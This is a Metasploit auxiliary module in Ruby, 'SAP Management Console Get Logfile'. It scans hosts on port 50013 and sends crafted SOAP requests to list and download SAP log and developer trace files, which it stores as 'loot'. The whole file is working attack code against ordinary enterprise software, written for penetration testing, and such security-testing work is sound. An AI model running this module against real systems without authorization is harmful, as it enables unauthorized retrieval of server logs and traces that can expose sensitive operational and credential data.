##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP Management Console Get Logfile',
      'Description' => %q{
        This module simply attempts to download available logfiles and
        developer tracefiles through the SAP Management Console SOAP
        Interface. Please use the sap_mgmt_con_listlogfiles
        extension to view a list of available files.
        },
      'References' => [
        [ 'URL', 'https://blog.c22.cc' ]
      ],
      'Author' => [
        'Chris John Riley', # original msf module
        'Bruno Morisson <bm[at]integrity.pt>' # bulk file retrieval
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        Opt::RPORT(50013),
        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
        OptString.new('RFILE', [ true, 'The name of the file to download ', 'sapstart.log']),
        OptEnum.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE', ['TRACEFILE', 'LOGFILE']]),
        OptBool.new('GETALL', [ false, 'Download all available files (WARNING: may take a long time!)', false])
      ]
    )
    register_autofilter_ports([ 50013 ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['URI']),
      'method' => 'GET'
    }, 25)

    if !res
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end
    if datastore['GETALL']
      listfiles(ip)
    else
      gettfiles(rhost, datastore['RFILE'].to_s, '')
    end
  end

  def listfiles(rhost)
    print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
    success = false
    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
    xs = 'http://www.w3.org/2001/XMLSchema'
    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'

    case datastore['FILETYPE'].to_s
    when /^LOG/i
      ns1 = 'ns1:ListLogFiles'
    when /^TRACE/i
      ns1 = 'ns1:ListDeveloperTraces'
    else
      print_error("#{rhost}:#{rport} [SAP] unsupported filetype #{datastore['FILETYPE']}")
      return
    end

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    begin
      res = send_request_raw({
        'uri' => normalize_uri(datastore['URI']),
        'method' => 'POST',
        'data' => data,
        'headers' =>
          {
            'Content-Length' => data.length,
            'SOAPAction' => '""',
            'Content-Type' => 'text/xml; charset=UTF-8'
          }
      }, 30)

      env = []
      if res && (res.code == 200)
        case res.body
        when %r{<file>(.*)</file>}i
          body = res.body
          env = body.scan(%r{<filename>(.*?)</filename><size>(.*?)</size><modtime>(.*?)</modtime>}i)
          success = true
        end
      elsif res && (res.code == 500)
        case res.body
        when %r{<faultstring>(.*)</faultstring>}i
          faultcode = ::Regexp.last_match(1).strip
          fault = true
        end
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication")
      return
    end

    if success
      print_good("#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}: #{env.length} files available")

      env.each do |output|
        gettfiles(rhost, output[0], output[1])
      end

    elsif fault
      print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
    else
      print_error("#{rhost}:#{rport} [SAP] failed to list files")
    end
  end

  def gettfiles(rhost, logfile, filelen)
    if filelen
      print_status("#{rhost}:#{rport} [SAP] Attempting to retrieve file #{logfile} (#{filelen} bytes)")
    else
      print_status("#{rhost}:#{rport} [SAP] Attempting to retrieve file #{logfile} (size unknown)")
    end
    success = false

    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
    xs = 'http://www.w3.org/2001/XMLSchema'
    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'

    case datastore['FILETYPE'].to_s
    when /^LOG/i
      ns1 = 'ns1:ReadLogFile'
    when /^TRACE/i
      ns1 = 'ns1:ReadDeveloperTrace'
    else
      print_error("#{rhost}:#{rport} [SAP] unsupported filetype: #{datastore['FILETYPE']}")
      return
    end

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"><filename>' + logfile + '</filename></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    begin
      res = send_request_raw({
        'uri' => normalize_uri(datastore['URI']),
        'method' => 'POST',
        'data' => data,
        'headers' =>
          {
            'Content-Length' => data.length,
            'SOAPAction' => '""',
            'Content-Type' => 'text/xml; charset=UTF-8'
          }
      }, 120)

      if res && (res.code == 200)
        case res.body
        when %r{<item>([^<]+)</item>}i
          body = res.body
          body.scan(%r{<item>([^<]+)</item>}i)
          success = true
        end

        case res.body
        when %r{<name>([^<]+)</name>}i
          ::Regexp.last_match(1).strip
          success = true
        end

      elsif res && (res.code == 500)
        case res.body
        when %r{<faultstring>(.*)</faultstring>}i
          faultcode = ::Regexp.last_match(1).strip
          fault = true
        end
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end

    if success
      print_good("#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}:#{logfile.downcase} looted")
      addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
      p = store_loot(
        "sap.#{datastore['FILETYPE'].downcase}.file",
        'text/xml',
        addr,
        res.body,
        "sap_#{logfile.downcase}.xml",
        'SAP Get Logfile'
      )
      print_status("Logfile stored in: #{p}")
    elsif fault
      print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
    else
      print_error("#{rhost}:#{rport} [SAP] failed to download file")
    end
  end
end
